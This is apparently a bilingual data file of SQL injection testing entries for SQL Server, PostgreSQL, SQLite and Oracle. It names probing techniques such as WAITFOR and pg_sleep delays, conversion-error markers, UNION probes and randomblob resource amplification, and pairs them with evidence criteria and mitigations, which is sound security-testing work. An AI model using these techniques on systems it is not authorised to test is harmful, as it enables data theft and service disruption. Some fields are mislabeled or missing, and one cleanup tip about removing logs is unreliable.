description.zh: 使用参数化查询隔离数据与表达式，统一生产错误响应，撤销不必要的函数和系统目录权限，并监控转换错误突增。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use parameterized queries, normalize production errors, revoke unnecessary function and catalog privileges, and monitor spikes in conversion failures. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: 跨数据库报错型 SQL 注入聚焦集合横跨 SQL Server 与多个 MySQL 版本函数，必须先识别 DBMS 和版本，再选择兼容分支；不兼容函数错误不等于数据泄露。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Cross-DBMS Error-Based SQL injection focuses on this boundary: The set spans SQL Server and functions from several MySQL versions, so identify the DBMS and version before choosing a compatible branch; an unsupported-function error is not disclosure. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入进入数据库表达式且底层异常被原样返回或可区分映射，类型转换或函数校验错误便可能携带表达式结果。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Input reaches a database expression while low-level exceptions are returned verbatim or mapped distinctly, allowing conversion or function-validation failures to carry expression results. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先比较正常表达式、固定类型错误和不存在函数三组响应，再只用与版本匹配的函数嵌入一个无害常量。 服务端异常日志必须稳定包含受控常量，并能对应到同一请求；普通语法错误、错误页变化或函数缺失都属于假阳性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Compare normal expression, fixed type error, and unknown-function responses, then embed one harmless constant using a function compatible with the confirmed version. Server exception logs must consistently contain the controlled constant and correlate to the request; syntax errors, changed error pages, or missing functions are false positives. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用参数化查询隔离数据与表达式，统一生产错误响应，撤销不必要的函数和系统目录权限，并监控转换错误突增。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use parameterized queries, normalize production errors, revoke unnecessary function and catalog privileges, and monitor spikes in conversion failures. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: SQL Server 时间与 UNION 注入
name.en: SQL Server Time and UNION Injection

description.zh: 针对 SQL Server 的 WAITFOR DELAY、类型转换和 UNION 列结构探针，用时间、错误与回显三类证据确认注入。
description.en: Targets SQL Server with WAITFOR DELAY, conversion errors, and UNION column probes, using timing, error, and reflected-output evidence.

prerequisites.zh: 确认后端为 SQL Server，并记录驱动是否允许分号、多语句以及 WAITFOR 所在表达式位置。
prerequisites.en: Confirm that the backend is SQL Server and record whether the driver permits semicolons, multiple statements, and the intended WAITFOR placement.

prerequisites.zh: 在低权限测试库中建立带会话标记的审计和稳定延迟基线，使用短延时的恒真/恒假配对样本。
prerequisites.en: Establish tagged-session auditing and a stable latency baseline in a low-privilege test database, using paired true and false samples with short delays.

description.en: MSSQL contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性可以是恒真分支相对恒假分支持续产生可统计的 WAITFOR 延迟并由 SQL Server 会话事件佐证，也可以是受控转换标记或 UNION 行被返回。单次超时、连接池排队、锁等待、语法错误或仅由 WAF 引入的延迟不是 SQL Server 注入证据。
analysis.en: Positive evidence can be a statistically repeatable WAITFOR delay for the true branch versus the false branch corroborated by SQL Server session events, or a controlled conversion marker or UNION row being returned. One timeout, connection-pool queueing, lock waits, syntax errors, or delay introduced only by the WAF is not SQL Server injection evidence.

opsecTips.zh: 达到预设延迟置信度或看到一个受控标记后停止，并限制每个会话只保留一个最短 WAITFOR。
opsecTips.en: Stop when the predefined timing confidence is reached or one controlled marker is observed, and permit only one shortest WAITFOR per session.

opsecTips.zh: 取消仍在等待的会话，排空并重建测试连接池，删除临时对象和会话标记，再恢复原有查询超时。
opsecTips.en: Cancel remaining waiting sessions, drain and rebuild the test connection pool, delete temporary objects and session tags, and restore the original query timeout.

title.zh: 确认Microsoft SQL Server 注入前置条件
title.en: Confirm Microsoft SQL Server Injection prerequisites

description.zh: 先确认 SQL Server，再依据驱动是否允许多语句选择 WAITFOR 的表达式或分号形式；延时次数必须受控以免阻塞连接池。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: Confirm SQL Server first, then choose expression or semicolon WAITFOR forms according to driver multi-statement support; strictly limit delays to avoid pool exhaustion. Record the database product, version, driver, field type, normal response, and server-log baseline.

description.en: Collect repeated normal requests for median and jitter, then send one short WAITFOR; if unstable, use a fixed CONVERT error or NULL-column probe. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

title.zh: 核对Microsoft SQL Server 注入成功证据
title.en: Verify Microsoft SQL Server Injection evidence

description.zh: 时间信号需重复统计并关联 SQL Server 会话，错误或 UNION 信号需对应最终 T-SQL；一次慢响应不能证明盲注。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Timing requires repeated statistics and SQL Server session correlation, while error or UNION evidence must match final T-SQL; one slow response proves nothing. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归Microsoft SQL Server 注入
title.en: Remediate and regress Microsoft SQL Server Injection

description.zh: 使用参数化 T-SQL 和类型化存储过程参数，关闭不需要的多语句能力，执行最小权限并监控 WAITFOR 与异常 UNION。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use parameterized T-SQL and typed stored-procedure parameters, disable unnecessary multi-statements, apply least privilege, and monitor WAITFOR and anomalous UNION use. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: SQL Server 时间与 UNION 注入聚焦先确认 SQL Server，再依据驱动是否允许多语句选择 WAITFOR 的表达式或分号形式；延时次数必须受控以免阻塞连接池。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: SQL Server Time and UNION Injection focuses on this boundary: Confirm SQL Server first, then choose expression or semicolon WAITFOR forms according to driver multi-statement support; strictly limit delays to avoid pool exhaustion. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入拼入 T-SQL 条件或语句尾部时，可注入 WAITFOR、CONVERT 或 UNION；详细错误与多语句设置放大可观察信号。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: When input is concatenated into a T-SQL predicate or statement tail, WAITFOR, CONVERT, or UNION can be injected; detailed errors and multi-statement settings amplify signals. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 采集多次正常请求计算中位数与抖动，之后只发送一次短 WAITFOR；若不稳定，则改用固定 CONVERT 错误或 NULL 列探针。 时间信号需重复统计并关联 SQL Server 会话，错误或 UNION 信号需对应最终 T-SQL；一次慢响应不能证明盲注。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Collect repeated normal requests for median and jitter, then send one short WAITFOR; if unstable, use a fixed CONVERT error or NULL-column probe. Timing requires repeated statistics and SQL Server session correlation, while error or UNION evidence must match final T-SQL; one slow response proves nothing. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用参数化 T-SQL 和类型化存储过程参数，关闭不需要的多语句能力，执行最小权限并监控 WAITFOR 与异常 UNION。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use parameterized T-SQL and typed stored-procedure parameters, disable unnecessary multi-statements, apply least privilege, and monitor WAITFOR and anomalous UNION use. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: PostgreSQL 时间与报错注入

description.zh: 使用 pg_sleep、类型转换和会话函数构造时间或报错证据，验证输入是否进入 PostgreSQL 表达式。
description.en: Uses pg_sleep, casts, and session functions to build timing or error evidence that input reached a PostgreSQL expression.

prerequisites.zh: 确认 PostgreSQL 版本、驱动多语句策略和参数所在的语句或表达式位置，避免误用其他方言。
prerequisites.en: Confirm the PostgreSQL version, the driver's multi-statement policy, and whether the parameter occupies a statement or expression position to avoid cross-dialect assumptions.

prerequisites.zh: 为测试连接设置 application_name 或等价会话标签，并采集 pg_stat_activity、错误日志和交错延迟基线。
prerequisites.en: Tag test connections with application_name or an equivalent session label, and collect pg_stat_activity, error logs, and interleaved latency baselines.

analysis.zh: 阳性是恒真条件下的 pg_sleep 样本与恒假条件形成稳定分布差异且可关联到数据库会话，或受控字符串通过 CAST 错误通道返回。驱动拒绝分号、普通网络抖动、statement_timeout、函数返回类型错误或单次慢查询都是假阳性边界。
analysis.en: A positive result is a stable timing-distribution difference between true-branch pg_sleep samples and false controls correlated to database sessions, or a controlled string returned through a CAST error channel. Driver rejection of semicolons, ordinary network jitter, statement_timeout, function return-type errors, or one slow query are false-positive boundaries.

opsecTips.zh: 交错样本达到预定统计阈值后停止，不增加 sleep 时长或并发数来强化现象。
opsecTips.en: 交错样本达到预定统计阈值后停止，不增加 sleep 时长或并发数来强化现象。

opsecTips.zh: 取消带测试标签的活动会话，恢复 statement_timeout，删除临时标记数据并移除诊断日志。
opsecTips.en: Cancel active tagged sessions, restore statement_timeout, delete temporary marker data, and remove diagnostic logs.

title.zh: 确认PostgreSQL 注入前置条件

description.zh: 该集合覆盖 pg_sleep 的语句与表达式位置及 CAST 报错；驱动对分号、多语句和函数返回类型的处理必须先核对。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: The set covers statement and expression placements for pg_sleep plus CAST errors; verify how the driver handles semicolons, multi-statements, and function return types. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控PostgreSQL 注入探针
title.en: Run a controlled PostgreSQL Injection probe

description.zh: 建立无延时统计基线后，用最短可识别的 pg_sleep 真假分支，或使用固定字符串的 CAST 错误作为独立证据。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: After a no-delay timing baseline, use the shortest distinguishable true and false pg_sleep branches or a fixed-string CAST error as an independent channel. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

title.zh: 核对PostgreSQL 注入成功证据

description.zh: 将响应耗时与 pg_stat_activity、慢查询或应用日志关联；网络抖动、锁等待和应用超时必须被排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Correlate response timing with pg_stat_activity, slow-query, or application logs and exclude network jitter, lock waits, and application timeouts. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归PostgreSQL 注入

description.zh: 使用 PostgreSQL 驱动绑定参数，限制连接角色权限，统一错误映射，设置语句超时并检测异常 pg_sleep 与转换失败。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use PostgreSQL driver bind parameters, reduce connection-role privileges, normalize errors, set statement timeouts, and detect anomalous pg_sleep calls and cast failures. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: PostgreSQL 时间与报错注入聚焦该集合覆盖 pg_sleep 的语句与表达式位置及 CAST 报错；驱动对分号、多语句和函数返回类型的处理必须先核对。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: PostgreSQL Time and Error Injection focuses on this boundary: The set covers statement and expression placements for pg_sleep plus CAST errors; verify how the driver handles semicolons, multi-statements, and function return types. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 拼接式 PostgreSQL 查询允许输入改变谓词、追加语句或调用函数，错误回显和宽权限会泄露会话与数据库信息。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Concatenated PostgreSQL queries let input alter predicates, append statements, or call functions, while verbose errors and broad privileges expose session and database information. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 建立无延时统计基线后，用最短可识别的 pg_sleep 真假分支，或使用固定字符串的 CAST 错误作为独立证据。 将响应耗时与 pg_stat_activity、慢查询或应用日志关联；网络抖动、锁等待和应用超时必须被排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: After a no-delay timing baseline, use the shortest distinguishable true and false pg_sleep branches or a fixed-string CAST error as an independent channel. Correlate response timing with pg_stat_activity, slow-query, or application logs and exclude network jitter, lock waits, and application timeouts. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用 PostgreSQL 驱动绑定参数，限制连接角色权限，统一错误映射，设置语句超时并检测异常 pg_sleep 与转换失败。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use PostgreSQL driver bind parameters, reduce connection-role privileges, normalize errors, set statement timeouts, and detect anomalous pg_sleep calls and cast failures. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: SQLite 资源消耗与版本探测

description.zh: 利用 randomblob、HEX、LIKE 和 sqlite_version 建立受控资源或函数执行差异，识别嵌入式查询注入。
description.en: Uses randomblob, HEX, LIKE, and sqlite_version to create controlled resource or function-execution differences for detecting embedded-query injection.

prerequisites.zh: 只在数据库副本和受资源限制的独立进程中验证，并从远低于语料中最大 randomblob 大小的样本开始。
prerequisites.en: Validate only against a database copy in a resource-limited process, starting with samples far below the corpus's maximum randomblob size.

prerequisites.zh: 持续记录 CPU、内存、查询时长以及 SQLite 版本，并用恒假分支和不同低档尺寸建立缩放曲线。
prerequisites.en: Continuously record CPU, memory, query duration, and SQLite version, and build a scaling curve with false branches and several low-size values.

description.en: SQLite contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求受控表达式在恒真分支中随 randomblob 尺寸呈可重复的资源或时延增长，或 sqlite_version 固定标记经可观察列返回，并能在进程内查询记录中对应。主机本身高负载、一次 OOM、数据库锁、页面超时或服务崩溃不构成可靠注入证明。
analysis.en: Positive evidence requires reproducible resource or timing growth with controlled randomblob size on the true branch, or a fixed sqlite_version marker returned through an observable column and correlated with in-process query records. Existing host load, one out-of-memory event, a database lock, page timeout, or service crash is not reliable injection proof.

opsecTips.zh: 低尺寸样本已经形成单调差异后立即停止，禁止执行 500000000 字节级别的最大值或并行放大测试。

opsecTips.zh: 终止测试工作进程，删除数据库副本及其 WAL/SHM 临时文件，释放资源配额并恢复原超时设置。
opsecTips.en: Terminate the test worker, delete the database copy and its WAL/SHM temporary files, release resource limits, and restore the original timeout settings.

description.zh: SQLite 没有通用 sleep，集合用大 randomblob 放大计算时间；应先缩小参数并观察随规模变化的趋势，禁止重复最大值。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: SQLite has no general sleep, so the set amplifies work with large randomblob values; start with reduced sizes and observe scaling rather than repeating maximum values. Record the database product, version, driver, field type, normal response, and server-log baseline.

description.en: Confirm only when timing and resources scale consistently with size and logs show function execution; one stall, garbage collection, or shared-host load is insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归SQLite 注入

description.zh: 使用 SQLite 绑定参数，设置执行预算、进度处理器和并发限制，限制数据库文件权限并监控异常大 BLOB 与长查询。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use SQLite bind parameters, execution budgets, progress handlers, and concurrency limits, restrict database-file permissions, and monitor large BLOB operations and long queries. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: SQLite 资源消耗与版本探测聚焦SQLite 没有通用 sleep，集合用大 randomblob 放大计算时间；应先缩小参数并观察随规模变化的趋势，禁止重复最大值。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: SQLite Resource-Consumption and Version Probes focuses on this boundary: SQLite has no general sleep, so the set amplifies work with large randomblob values; start with reduced sizes and observe scaling rather than repeating maximum values. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入被拼进 SQLite 表达式后可调用内置函数或访问系统表；数据库常与应用进程共享 CPU 和内存，因此昂贵表达式也影响可用性。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Concatenated SQLite input can call built-in functions or inspect catalogs; because SQLite often shares application CPU and memory, expensive expressions also affect availability. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 确认 SQLite 后测量固定数据集基线，再从低规模 randomblob 逐级增加并对比恒假分支，同时观察进程 CPU、内存和超时。 只有耗时和资源随参数规模稳定增长且日志显示函数执行才确认；单次卡顿、进程 GC 或共享主机负载都不是充分证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: After confirming SQLite, measure a fixed-data baseline, then increase a low randomblob size gradually against a false branch while observing process CPU, memory, and timeouts. Confirm only when timing and resources scale consistently with size and logs show function execution; one stall, garbage collection, or shared-host load is insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用 SQLite 绑定参数，设置执行预算、进度处理器和并发限制，限制数据库文件权限并监控异常大 BLOB 与长查询。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use SQLite bind parameters, execution budgets, progress handlers, and concurrency limits, restrict database-file permissions, and monitor large BLOB operations and long queries. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: Oracle 布尔、报错与 UNION 注入
name.en: Oracle Boolean, Error, and UNION Injection

description.zh: 覆盖 Oracle 的布尔条件、DUAL/UNION、类型转换与包函数报错，并标明需要排除的跨方言残留。
description.en: Covers Oracle Boolean predicates, DUAL/UNION, conversion and package-function errors while flagging cross-dialect residues that must be excluded.

prerequisites.zh: 确认 Oracle 版本以及 DUAL、ROWNUM 和相关包函数在测试账户下的可用性，并剔除 MySQL 方言残留。
prerequisites.en: Confirm the Oracle version and availability of DUAL, ROWNUM, and relevant package functions for the test account, excluding MySQL-dialect residue.

prerequisites.zh: 使用受限 schema、合成标记表和数据库审计，准备结构一致的恒真/恒假谓词与无权限包调用对照。
prerequisites.en: Use a restricted schema, a synthetic marker table, and database auditing, with structurally matched true/false predicates and an unauthorized package-call control.
